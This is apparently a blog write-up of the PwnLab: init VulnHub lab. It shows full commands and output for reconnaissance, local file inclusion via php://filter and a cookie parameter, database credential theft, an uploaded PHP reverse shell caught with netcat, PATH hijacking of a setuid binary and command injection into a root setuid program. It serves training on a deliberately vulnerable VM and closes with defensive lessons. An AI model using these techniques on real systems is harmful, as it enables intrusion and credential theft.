---
title: "Gaining access to PwnLab: init (VulnHub)"
date: 2020-05-04
tags: [offensive security, vulnhub, gaining access]
header:
  image: "/images/banner2.png"
  excerpt: "Offensive security, VulnHub, Gaining access"
---

I started out by finding the IP address of the target's machine. This can be done with ``netdiscover``, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.

```bash
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

Currently scanning: 192.168.70.0/16   |   Screen View: Unique Hosts                                                                                                          

3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                              
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                                                                             
192.168.56.100  08:00:27:52:e2:88      1      60  PCS Systemtechnik GmbH                                                                                                     
192.168.56.115  08:00:27:b2:5c:1d      1      60  PCS Systemtechnik GmbH  
```

I then ran an nmap scan against the target's IP address 192.168.56.115 to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. However, since this way of scanning made me initially miss a crucial port during my latest writeup [Gaining access to Stapler (VulnHub)](https://holstrater.github.io/stapler/), I now added the `-p-` option. This checks all possible ports, not just the most common ones. I saved the output in a file because I don’t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

```bash
kali@kali:~$ sudo nmap -p- -sS -A -n -oA pwnlab_init 192.168.56.115
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 15:56 EDT
Nmap scan report for 192.168.56.115
Host is up (0.00052s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37367/tcp6  status
|   100024  1          44963/tcp   status
|   100024  1          48397/udp6  status
|_  100024  1          57506/udp   status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: FoundRows, SupportsTransactions, Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsCompression, ODBCClient, IgnoreSigpipes, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, LongPassword, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: N-3YG:)]yl3U2:m7g&"v
|_  Auth Plugin Name: mysql_native_password
44963/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:B2:5C:1D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.56.115

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
```

As expected, no useful exploits found for the versions running on the target's machine. Starting at the top, I took a look at the website that was being hosted. I found a few interesting things (such as the `/config.php` file but I couldn't view it), but nothing I could exploit:

```bash
kali@kali:~$ nikto -h 192.168.56.115
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.115
+ Target Hostname:    192.168.56.115
+ Target Port:        80
+ Start Time:         2020-05-04 16:43:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Cookie PHPSESSID created without the httponly flag
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2020-05-04 16:44:45 (GMT-4) (49 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
kali@kali:~$ dirb http://192.168.56.115

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May  4 16:47:05 2020
URL_BASE: http://192.168.56.115/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.115/ ----
==> DIRECTORY: http://192.168.56.115/images/                                                                                                                                  
+ http://192.168.56.115/index.php (CODE:200|SIZE:332)                                                                                                                         
+ http://192.168.56.115/server-status (CODE:403|SIZE:302)                                                                                                                     
==> DIRECTORY: http://192.168.56.115/upload/                                                                                                                                  

---- Entering directory: http://192.168.56.115/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.115/upload/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Mon May  4 16:47:06 2020
DOWNLOADED: 4612 - FOUND: 2
```

I investigated the other services running on the target's machine, but since there were so few of them and since I didn't find anything there either, I grew more and more convinced that the website was my way in. In almost all of the similar challenges I've done so far, the ones that hosted websites usually did so for a reason. After all, there's simply so much attack surface on websites that it's not completely unlike real scenario's either.

What stood out to me was the `?page=` parameter, which is always a possible candidate for Local File Inclusion (LFI) or command injection. Using an LFI cheatsheet that I saved a while ago, I started enumerating. After a while I finally found something - using LFI i could view the `config.php` file by using `php://filter` and `base64` encoding the output:

![alt]({{ site.url }}{{ site.baseurl }}/images/pwnlabinit_url.png)

```bash
kali@kali:~$ echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

Looked like I had working MySQL credentials for the `root` user, from where I was able to find additional credentials:

```bash
kali@kali:~$ mysql -u root -p -h 192.168.56.115
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 147
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.001 sec)

MySQL [(none)]> use Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.001 sec)

MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.001 sec)
```

These new passwords seemed base64 encoded, so I decoded them:

```bash
kali@kali:~$ echo "Sld6WHVCSkpOeQ==" | base64 -d
JWzXuBJJNy
kali@kali:~$ echo "U0lmZHNURW42SQ==" | base64 -d
SIfdsTEn6I
kali@kali:~$ echo "aVN2NVltMkdSbw==" | base64 -d
iSv5Ym2GRo
```

I tried out the credentials of `kent` on the login form on the website, which worked and gave me access to a file uploading application. I remembered being able to view an empty `/upload/` path earlier, so if I uploaded a reverse PHP shell I hoped I was able to run it and give myself a shell on the target's machine. Unfortunately, this didn't work by simply opening the file via `/uploads/`. I had to open the file in some other way, so I looked around some more. Since I was able to use LFI to view `config.php`, I should also be able to view other files such as `index.php`, `login.php` and `upload.php`. I read the code of all three, but since I already managed to successfully upload a file and log in, my focus was on `index.php`. I came across this piece of PHP code:

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
        if (isset($_GET['page']))
        {
                include($_GET['page'].".php");
        }
        else
        {
                echo "Use this server to upload and share image files inside the intranet";
        }
?>
```

It seemed like the `include()` function was vulnerable to LFI as well. A `lang` value stored in the `cookie` value could easily be manipulated with something like BurpSuite. I managed to open system files such as `/etc/passwd` while I was testing this:

![alt]({{ site.url }}{{ site.baseurl }}/images/pwnlabinit_passwd1.png)

![alt]({{ site.url }}{{ site.baseurl }}/images/pwnlabinit_passwd2.png)

That meant I could also finally open the reverse shell file I uploaded earlier, gaining direct access to the target's machine:

![alt]({{ site.url }}{{ site.baseurl }}/images/pwnlabinit_shell.png)


```bash
kali@kali:~$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.115] 55523
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 00:06:06 up  6:13,  0 users,  load average: 0.00, 0.01, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I changed my shell to a more upgraded one and checked both `sudo -l` and the home directory on all of the accounts I obtained the credentials for earlier. `sudo` didn't work for any of them, and I couldn't even `su` to the `mike` user, which led me to suspect that `mike` was somehow important or related to my next steps. After all, at this point my privileges were still very limited which I needed to elevate to full ones in order to gain complete control of the target's system. I found something interesting in `kane`s home directory:

```sh
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su kane
su kane
Password: iSv5Ym2GRo
kane@pwnlab:/$ cd /home/kane
cd /home/kane
kane@pwnlab:~$ ls -al
ls -al
total 28
drwxr-x--- 2 kane kane 4096 Mar 17  2016 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
kane@pwnlab:~$ file msgmike
file msgmike
msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped
kane@pwnlab:~$ ./msgmike
./msgmike
cat: /home/mike/msg.txt: No such file or directory
```

Looked like I was right about the suspicion I had about the `mike` user. Looking closely at `cat: /home/mike/msg.txt: No such file or directory`, I figured out that `cat` was missing the full path to the `cat` binary. This meant I could create another file called `cat` and prioritize it by adding the path that new file resided in to my `$PATH`variable. This would result in my newly created `cat` file being executed instead of the `cat` binary that was originally intended to execute. The new `cat` file would be run as the `mike` user.

This meant that I could do the following:

```sh
kane@pwnlab:~$ echo "/bin/bash" > /tmp/cat
echo "/bin/bash" > /tmp/cat
kane@pwnlab:~$ export PATH="/tmp:$PATH"
export PATH="/tmp:$PATH"
kane@pwnlab:~$ chmod 777 /tmp/cat
chmod 777 /tmp/cat
kane@pwnlab:~$ ./msgmike
./msgmike
mike@pwnlab:~$ whoami
whoami
mike
```

Now that I had a shell for `mike`, I repeated the process of first checking my home directory. I found another similar file, `msg2root`. This file ran as root and seemed to echo my user input (it's very possible it did more but running `strings` on it crashed my vm...). If it handled my input as root, why not see if I could inject a second command to it? Turns out I could:

```sh
mike@pwnlab:/home/mike$ ls
ls
msg2root
mike@pwnlab:/home/mike$ file msg2root
file msg2root
msg2root: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=60bf769f8fbbfd406c047f698b55d2668fae14d3, not stripped
mike@pwnlab:/home/mike$ ./msg2root
./msg2root
Message for root: test
test
test
mike@pwnlab:/home/mike$ ./msg2root
./msg2root
Message for root: test; /bin/bash
test; /bin/bash
test
bash-4.3$ whoami
whoami
mike
bash-4.3$ ./msg2root
./msg2root
Message for root: another test || /bin/bash
another test || /bin/bash
another test
bash-4.3$ whoami
whoami
mike
bash-4.3$ ./msg2root
./msg2root
Message for root: a third test && /bin/bash
a third test && /bin/bash
a third test
bash-4.3$ whoami
whoami
mike
bash-4.3$ ./msg2root
./msg2root
Message for root: test; /bin/sh
test; /bin/sh
test
# whoami
whoami
root
```

## Lessons learned

A significant number of ways into and through the target's system depended on local file inclusion and command injection exploits. It's absolutely crucial that user input is validated and sanitized sufficiently, this should not be neglected in writing or reviewing code.

Another important factor in elevating my privileges on the target's machine was being able to find user credentials stored in the MySQL database. These passwords were stored as base64-encoded strings, which is better than storing as plaintext but still a lot more insecure than storing as encrypted strings. If strong encryption had been used (or if these passwords hadn't been stored there in the first place), I wouldn't have been able to log in as the `kane` and `kent` users from where I elevated my privileges even further.
